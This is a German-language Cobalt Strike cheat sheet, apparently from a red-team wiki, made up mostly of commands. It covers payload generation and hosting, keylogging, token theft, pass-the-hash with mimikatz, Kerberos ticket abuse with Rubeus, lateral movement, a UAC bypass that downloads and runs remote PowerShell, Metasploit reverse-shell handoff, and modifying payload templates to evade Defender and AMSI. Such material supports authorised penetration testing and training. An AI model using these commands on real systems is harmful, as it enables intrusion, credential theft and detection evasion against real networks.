# Cobalt Strike

### Listener

### C2 Listener

`Cobalt Strike -> Listener -> Hinzufügen/Bearbeiten` dann können Sie auswählen, wo Sie hören möchten, welche Art von Beacon verwendet werden soll (http, dns, smb...) und mehr.

### Peer2Peer Listener

Die Beacons dieser Listener müssen nicht direkt mit dem C2 kommunizieren, sie können über andere Beacons mit ihm kommunizieren.

`Cobalt Strike -> Listener -> Hinzufügen/Bearbeiten` dann müssen Sie die TCP- oder SMB-Beacons auswählen.

* Der **TCP-Beacon wird einen Listener im ausgewählten Port einrichten**. Um sich mit einem TCP-Beacon zu verbinden, verwenden Sie den Befehl `connect <ip> <port>` von einem anderen Beacon.
* Der **smb-Beacon wird in einem Pipename mit dem ausgewählten Namen hören**. Um sich mit einem SMB-Beacon zu verbinden, müssen Sie den Befehl `link [target] [pipe]` verwenden.

### Payloads generieren & hosten

#### Payloads in Dateien generieren

`Attacks -> Packages ->`&#x20;

* **`HTMLApplication`** für HTA-Dateien
* **`MS Office Macro`** für ein Office-Dokument mit einem Makro
* **`Windows Executable`** für eine .exe, .dll oder Dienst .exe
* **`Windows Executable (S)`** für eine **stageless** .exe, .dll oder Dienst .exe (besser stageless als staged, weniger IoCs)

#### Payloads generieren & hosten

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Dies generiert ein Skript/executables, um den Beacon von Cobalt Strike in Formaten wie: bitsadmin, exe, powershell und python herunterzuladen.

#### Payloads hosten

Wenn Sie bereits die Datei haben, die Sie auf einem Webserver hosten möchten, gehen Sie einfach zu `Attacks -> Web Drive-by -> Host File` und wählen Sie die Datei zum Hosten und die Webserver-Konfiguration aus.

### Beacon-Optionen

<pre class="language-bash"><code class="lang-bash"># Führen Sie lokale .NET-Binärdatei aus
execute-assembly &#x3C;/path/to/executable.exe>

# Screenshots
printscreen    # Machen Sie einen einzelnen Screenshot über die PrintScr-Methode
screenshot     # Machen Sie einen einzelnen Screenshot
screenwatch    # Machen Sie periodische Screenshots des Desktops
## Gehen Sie zu Ansicht -> Screenshots, um sie zu sehen

# Keylogger
keylogger [pid] [x86|x64]
## Ansicht > Tastenanschläge, um die gedrückten Tasten zu sehen

# Portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Fügen Sie die Portscan-Aktion in einen anderen Prozess ein
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
# Powershell-Modul importieren
powershell-import C:\path\to\PowerView.ps1
powershell &#x3C;schreiben Sie hier den powershell-Befehl>

# Benutzeridentifikation
## Token-Generierung mit Anmeldeinformationen
make_token [DOMAIN\user] [password] #Token erstellen, um einen Benutzer im Netzwerk zu impersonieren
ls \\computer_name\c$ # Versuchen Sie, das generierte Token zu verwenden, um auf C$ in einem Computer zuzugreifen
rev2self # Stoppen Sie die Verwendung des mit make_token generierten Tokens
## Die Verwendung von make_token erzeugt Ereignis 4624: Ein Konto wurde erfolgreich angemeldet. Dieses Ereignis ist in einer Windows-Domäne sehr häufig, kann jedoch durch Filtern nach dem Anmeldetyp eingegrenzt werden. Wie oben erwähnt, verwendet es LOGON32_LOGON_NEW_CREDENTIALS, was Typ 9 ist.

# UAC-Umgehung
elevate svc-exe &#x3C;listener>
elevate uac-token-duplication &#x3C;listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Token von pid stehlen
## Wie make_token, aber das Token von einem Prozess stehlen
steal_token [pid] # Dies ist auch nützlich für Netzwerkaktionen, nicht für lokale Aktionen
## Aus der API-Dokumentation wissen wir, dass dieser Anmeldetyp "dem Aufrufer erlaubt, sein aktuelles Token zu klonen". Deshalb sagt die Beacon-Ausgabe Impersonated &#x3C;current_username> - es impersoniert unser eigenes geklontes Token.
ls \\computer_name\c$ # Versuchen Sie, das generierte Token zu verwenden, um auf C$ in einem Computer zuzugreifen
rev2self # Stoppen Sie die Verwendung des Tokens von steal_token

## Prozess mit neuen Anmeldeinformationen starten
spawnas [domain\username] [password] [listener] #Führen Sie es aus einem Verzeichnis mit Lesezugriff aus, z. B.: cd C:\
## Wie make_token wird dies Windows-Ereignis 4624 erzeugen: Ein Konto wurde erfolgreich angemeldet, jedoch mit einem Anmeldetyp von 2 (LOGON32_LOGON_INTERACTIVE). Es wird den aufrufenden Benutzer (TargetUserName) und den impersonierten Benutzer (TargetOutboundUserName) detailliert beschreiben.

## In Prozess injizieren
inject [pid] [x64|x86] [listener]
## Aus einer OpSec-Perspektive: Führen Sie keine plattformübergreifende Injektion durch, es sei denn, Sie müssen wirklich (z. B. x86 -> x64 oder x64 -> x86).

## Pass the hash
## Dieser Modifikationsprozess erfordert das Patchen des LSASS-Speichers, was eine hochriskante Aktion ist, lokale Administratorrechte erfordert und nicht sehr praktikabel ist, wenn Protected Process Light (PPL) aktiviert ist.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash durch mimikatz
mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
## Ohne /run startet mimikatz eine cmd.exe, wenn Sie als Benutzer mit Desktop ausgeführt werden, sieht er die Shell (wenn Sie als SYSTEM ausgeführt werden, sind Sie gut dabei)
steal_token &#x3C;pid> #Token von dem durch mimikatz erstellten Prozess stehlen

## Pass the ticket
## Ticket anfordern
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
## Erstellen Sie eine neue Anmeldesitzung, um das neue Ticket zu verwenden (um das kompromittierte nicht zu überschreiben)
make_token &#x3C;domain>\&#x3C;username> DummyPass
## Schreiben Sie das Ticket auf die Angreifer-Maschine von einer Powershell-Sitzung &#x26; laden Sie es
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket von SYSTEM
## Erzeugen Sie einen neuen Prozess mit dem Ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMAIN> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Stehlen Sie das Token von diesem Prozess
steal_token &#x3C;pid>

## Ticket extrahieren + Ticket übergeben
### Tickets auflisten
execute-assembly C:\path\Rubeus.exe triage
### Interessantes Ticket nach luid dumpen
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
### Neue Anmeldesitzung erstellen, beachten Sie luid und processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Ticket in der generierten Anmeldesitzung einfügen
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Schließlich das Token von diesem neuen Prozess stehlen
steal_token &#x3C;pid>

# Laterale Bewegung
## Wenn ein Token erstellt wurde, wird es verwendet
jump [method] [target] [listener]
## Methoden:
## psexec                    x86   Verwenden Sie einen Dienst, um ein Service EXE-Artefakt auszuführen
## psexec64                  x64   Verwenden Sie einen Dienst, um ein Service EXE-Artefakt auszuführen
## psexec_psh                x86   Verwenden Sie einen Dienst, um eine PowerShell-Einzeiler auszuführen
## winrm                     x86   Führen Sie ein PowerShell-Skript über WinRM aus
## winrm64                   x64   Führen Sie ein PowerShell-Skript über WinRM aus

remote-exec [method] [target] [command]
## Methoden:
<strong>## psexec                          Remote ausführen über den Dienststeuerungsmanager
</strong>## winrm                           Remote ausführen über WinRM (PowerShell)
## wmi                             Remote ausführen über WMI

## Um einen Beacon mit wmi auszuführen (es ist nicht im jump-Befehl), laden Sie einfach den Beacon hoch und führen Sie ihn aus
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Sitzung an Metasploit übergeben - Durch Listener
## Auf dem Metasploit-Host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Auf Cobalt: Listener > Hinzufügen und das Payload auf Foreign HTTP setzen. Setzen Sie den Host auf 10.10.5.120, den Port auf 8080 und klicken Sie auf Speichern.
beacon> spawn metasploit
## Sie können nur x86 Meterpreter-Sitzungen mit dem ausländischen Listener starten.

# Sitzung an Metasploit übergeben - Durch Shellcode-Injektion
## Auf dem Metasploit-Host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
## Führen Sie msfvenom aus und bereiten Sie den multi/handler-Listener vor

## Kopieren Sie die Binärdatei auf den Cobalt Strike-Host
ps
shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Injizieren Sie den Metasploit-Shellcode in einen x64-Prozess

# Metasploit-Sitzung an Cobalt Strike übergeben
## Generieren Sie stageless Beacon-Shellcode, gehen Sie zu Angriffe > Pakete > Windows Executable (S), wählen Sie den gewünschten Listener aus, wählen Sie Raw als Ausgabetyp und wählen Sie Use x64 payload.
## Verwenden Sie post/windows/manage/shellcode_inject in Metasploit, um den generierten Cobalt Strike-Shellcode zu injizieren.


# Pivoting
## Öffnen Sie einen Socks-Proxy im Teamserver
beacon> socks 1080

# SSH-Verbindung
beacon> ssh 10.10.17.12:22 benutzername passwort</code></pre>

## Vermeidung von AVs

### Artefakt-Kit

Normalerweise finden Sie im Verzeichnis `/opt/cobaltstrike/artifact-kit` den Code und die vorcompilierten Vorlagen (in `/src-common`) der Payloads, die Cobalt Strike verwenden wird, um die binären Beacons zu generieren.

Mit [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) können Sie mit dem generierten Backdoor (oder nur mit der kompilierten Vorlage) herausfinden, was den Defender auslöst. Es ist normalerweise eine Zeichenfolge. Daher können Sie einfach den Code, der die Backdoor generiert, so ändern, dass diese Zeichenfolge nicht in der endgültigen Binärdatei erscheint.

Nachdem Sie den Code geändert haben, führen Sie einfach `./build.sh` aus demselben Verzeichnis aus und kopieren Sie den `dist-pipe/`-Ordner in den Windows-Client unter `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Vergessen Sie nicht, das aggressive Skript `dist-pipe\artifact.cna` zu laden, um Cobalt Strike anzuzeigen, dass die Ressourcen von der Festplatte verwendet werden sollen, die wir möchten, und nicht die geladenen.

### Resource Kit

Der ResourceKit-Ordner enthält die Vorlagen für die skriptbasierten Payloads von Cobalt Strike, einschließlich PowerShell, VBA und HTA.

Mit [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) können Sie mit den Vorlagen herausfinden, was der Defender (in diesem Fall AMSI) nicht mag, und es anpassen:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Durch das Ändern der erkannten Zeilen kann man eine Vorlage erstellen, die nicht erkannt wird.

Vergessen Sie nicht, das aggressive Skript `ResourceKit\resources.cna` zu laden, um Cobalt Strike anzuweisen, die Ressourcen von der Festplatte zu verwenden, die wir möchten, und nicht die geladenen.
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

